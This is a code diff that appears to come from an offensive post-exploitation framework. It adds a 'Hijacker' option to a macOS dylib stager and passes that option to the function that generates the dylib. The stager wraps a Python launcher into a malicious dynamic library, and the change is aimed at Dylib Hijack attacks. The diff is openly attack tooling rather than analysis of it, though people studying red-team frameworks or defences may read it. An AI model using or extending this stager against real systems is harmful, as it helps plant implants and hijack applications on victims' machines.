@@ -36,6 +36,11 @@ class Stager:
                 'Required'      :   True,
                 'Value'         :   'True'
             },
+            'Hijacker' : {
+                'Description'   :   'Generate dylib to be used in a Dylib Hijack',
+                'Required'      :   True,
+                'Value'         :   'False'
+            },
             'OutFile' : {
                 'Description'   :   'File to write the dylib.',
                 'Required'      :   True,
@@ -65,6 +70,7 @@ class Stager:
         userAgent = self.options['UserAgent']['Value']
         arch = self.options['Arch']['Value']
         LittleSnitch = self.options['LittleSnitch']['Value']
+        hijacker = self.options['Hijacker']['Value']
 
         if arch == "":
             print helpers.color("[!] Please select a valid architecture")
@@ -80,5 +86,5 @@ class Stager:
         else:
 
             launcher = launcher.strip('echo').strip(' | python &').strip("\"")
-            dylib = self.mainMenu.stagers.generate_dylib(launcher, arch)
+            dylib = self.mainMenu.stagers.generate_dylib(launcherCode=launcher, arch=arch, hijacker=hijacker)
             return dylib
